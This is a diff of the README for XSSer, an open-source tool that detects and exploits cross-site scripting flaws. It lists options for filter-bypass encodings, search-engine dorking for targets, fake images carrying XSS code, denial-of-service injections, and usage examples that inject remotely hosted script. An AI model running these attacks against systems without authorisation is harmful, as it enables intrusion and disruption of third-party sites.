@@ -2,7 +2,7 @@
 Introduction:
 ==============================
 
-XSSer is an open source penetration testing tool that automates the process of detecting and exploiting XSS injections against different applications.
+Cross Site "Scripter" is an automatic -framework- to detect, exploit and report XSS vulnerabilities in web-based aplications.
 
 It contains several options to try to bypass certain filters, and various special techniques of code injection.
 
@@ -13,26 +13,21 @@ is copyrighted by psy (root@lordepsylon.net - epsylon@riseup.net).
 Options and features:
 ==============================
  
-./XSSer.py [OPTIONS] [-u <url> |-i <file> |-d <dork>] [-g <get> |-p <post> |-c <crawl>] [Request(s)] [Vector(s)] [Bypasser(s)] [Technique(s)] [Final Injection(s)]
-
-Cross Site "Scripter" is an automatic tool for pentesting XSS attacks against
-different applications.
+xsser [OPTIONS] [-u <url> |-i <file> |-d <dork>] [-g <get> |-p <post> |-c <crawl>] [Request(s)] [Vector(s)] [Bypasser(s)] [Technique(s)] [Final Injection(s)]
 
 Options:
   --version             show program's version number and exit
   -h, --help            show this help message and exit
-  -v, --verbose         verbose (default: no)
-  -s                    show statistics with all injection attempts responses
-  -w                    output all results directly to template (XSSlist.dat)
-  --xml=FILEXML         output 'positives' to aXML file (--xml filename.xml)
-  --publish             output 'positives' to Social Networks (identi.ca)
-  --short=SHORTURLS     output -final code- shortered (tinyurl, is.gd)
-  --imx=IMX             create a false image with XSS code embedded
-  --fla=FLASH           create a false .swf file with XSS code embedded
-  --check               send a hash to pre-check if target repeats all content
-                        recieved (usefull to reduce 'false positive' results)
-  --launch              launch a browser at the end, with each 'positive'
-                        final code injection(s) discovered
+  -s, --statistics      show advanced statistics output results
+  -v, --verbose         active verbose mode output results
+  --gtk                 launch XSSer GTK Interface
+
+  *Special Features*:
+    You can choose Vector(s) and Bypasser(s) to inject code with this
+    extra special features:
+
+    --imx=IMX           create a false image with XSS code embedded
+    --fla=FLASH         create a false .swf file with XSS code embedded
 
   *Select Target(s)*:
     At least one of these options has to be specified to set the source to
@@ -41,17 +36,19 @@ Options:
     -u URL, --url=URL   Enter target(s) to audit
     -i READFILE         Read target urls from a file
     -d DORK             Process search engine dork results as target urls
-    --De=DORK_ENGINE    Search engine to use for dorking (duck, altavista,
-                        bing, baidu, yandex, yebol, youdao, google, yahoo)
+    --De=DORK_ENGINE    Search engine to use for dorking (bing, altavista, 
+                        yahoo, baidu, yandex, youdao, webcrawler, ask, etc. 
+                        See dork.py file to check for available engines)
 
   *Select type of HTTP/HTTPS Connection(s)*:
     These options can be used to specify which parameter(s) we want to use
     like payload to inject code.
 
-    -g GETDATA          Enter payload to audit using GET. (ex: '/menu.php?q=')
-    -p POSTDATA         Enter payload to audit using POST. (ex: 'foo=1&bar=')
-    -c CRAWLING         Crawl target hierarchy parameters (can be slow!)
-    --Cw=CRAWLER_WIDTH  Number of urls to visit when crawling (deeping level)
+    -g GETDATA          Enter payload to audit using GET (ex: '/menu.php?q=')
+    -p POSTDATA         Enter payload to audit using POST (ex: 'foo=1&bar=')
+    -c CRAWLING         Number of urls to crawl on target(s): 1-99999
+    --Cw=CRAWLER_WIDTH  Deeping level of crawler: 1-5
+    --Cl                Crawl only local target(s) urls (default TRUE)
 
   *Configure Request(s)*:
     These options can be used to specify how to connect to target(s)
@@ -66,8 +63,17 @@ Options:
     --proxy=PROXY       Use proxy server (tor: http://localhost:8118)
     --timeout=TIMEOUT   Select your Timeout (default 30)
     --delay=DELAY       Delay in seconds between each HTTP request (default 8)
-    --threads=THREADS   Maximum number of concurrent HTTP requests (default 1)
+    --threads=THREADS   Maximum number of concurrent HTTP requests (default 5)
     --retries=RETRIES   Retries when the connection timeouts (default 3)
+
+  *Checker systems*:
+    This options are usefull to know if your target(s) have some filters
+    against XSS attacks and-or repeat all code who recieved:
+
+    --hash              send a hash to pre-check if target repeats all content
+                        recieved (usefull to predict 'false positive' results)
+    --heuristic         launch a heuristic testing to discover who parameters
+                        can be filtered on target(s) code: ;\/<>"'=
 
   *Select Vector(s)*:
     These options can be used to specify a XSS vector source code to
@@ -84,14 +90,14 @@ Options:
     techniques to provide encoding:
 
     --Str               Use method String.FromCharCode()
-    --Une               Use function Unescape()
+    --Une               Use Unescape() function
     --Mix               Mix String.FromCharCode() and Unescape()
     --Dec               Use Decimal encoding
     --Hex               Use Hexadecimal encoding
     --Hes               Use Hexadecimal encoding, with semicolons
     --Dwo               Encode vectors IP addresses in DWORD
     --Doo               Encode vectors IP addresses in Octal
-    --Cem=CEM           Try -manually- different Character Encoding mutations
+    --Cem=CEM           Try -manually- different Character Encoding Mutations
                         (reverse obfuscation: good) -> (ex: 'Mix,Une,Str,Hex')
 
   *Special Technique(s)*:
@@ -102,7 +108,9 @@ Options:
     --Xsa               XSA - Cross Site Agent Scripting
     --Xsr               XSR - Cross Site Referer Scripting
     --Dcp               DCP - Data Control Protocol injections
-    --Dom               DOM - Use Anchor Stealth (DOM shadows!)
+    --Dom               DOM - Document Object Model injections
+    --Ind               IND - HTTP Response Splitting Induced code
+    --Anchor            ANC - Use Anchor Stealth payloader (DOM shadows!)
 
   *Select Final injection(s)*:
     These options can be used to specify the final code to inject in
@@ -111,16 +119,26 @@ Options:
 
     --Fp=FINALPAYLOAD   OWN    - Insert your final code to inject -manually-
     --Fr=FINALREMOTE    REMOTE - Insert your final code to inject -remotelly-
+    --Doss              DOSs   - XSS Denial of service (server) injection
+    --Dos               DOS    - XSS Denial of service (client) injection
     --B64               B64    - Base64 code encoding in META tag (rfc2397)
-    --Dos               DOS    - XSS Denial of service (client) attack!!
 
   *Special Final injection(s)*:
     These options can be used to execute some 'special' injection(s) in
     vulnerable target(s). You can select multiple and combine with your
-    final code:
+    final code (except with DCP code):
 
     --Onm               ONM - Use onMouseMove() event to inject code
     --Ifr               IFR - Use <iframe> source tag to inject code
+
+  *Miscellaneous*:
+    --silent            inhibit console output results
+    --update            check for XSSer latest stable version
+    --save              output all results directly to template (XSSlist.dat)
+    --xml=FILEXML       output 'positives' to aXML file (--xml filename.xml)
+    --publish           output 'positives' to Social Networks (identi.ca)
+    --short=SHORTURLS   display -final code- shortered (tinyurl, is.gd)
+    --launch            launch a browser at the end with each XSS discovered
 
 ================================================================
 Examples of usage:
@@ -188,7 +206,7 @@ $ python XSSer.py -i "list_of_url_targets.txt" --auto --timeout "20" --threads "
 -------------------
 * Injection of user XSS vector directly in a malicious -fake- image created "on the wild", and ready to be uploaded.
 
-$ pyton XSSer.py --Imx "test.png" --payload "!enter your malicious injection code here!"
+$ python XSSer.py --Imx "test.png" --payload "!enter your malicious injection code here!"
 
 -------------------
 * Report output 'positives' injections of a dorking search (using "ask" dorker) directly to a XML file.
@@ -231,12 +249,3 @@ $ python XSSer.py -u "host.com" -g "vulnerable_path" --payload "valid_vector_inj
  
 $ python XSSer.py -u "host.com" -g "vulnerable_path" --auto --Fr "my_host/path/code.js" --launch
 
-================================================================
-Contribute
-==============================
-
-If you want to contribute to XSSer development reporting a bug, providing a patch, commenting on the code base or simply need to find help to run XSSer first refer to the xsser documentation, then surf the xsser mailing list (Xsser-users@lists.sourceforge.net) online archives and if you still have something to say, do that on the appropriate xsser mailing list. If nobody gets back to you, then drop me an e-mail (root@lordepsylon.net - epsylon@riseup.net).
-
-If you discover any vulnerability in a software using XSSer, please add to the report a link to this site.
-
-==============================
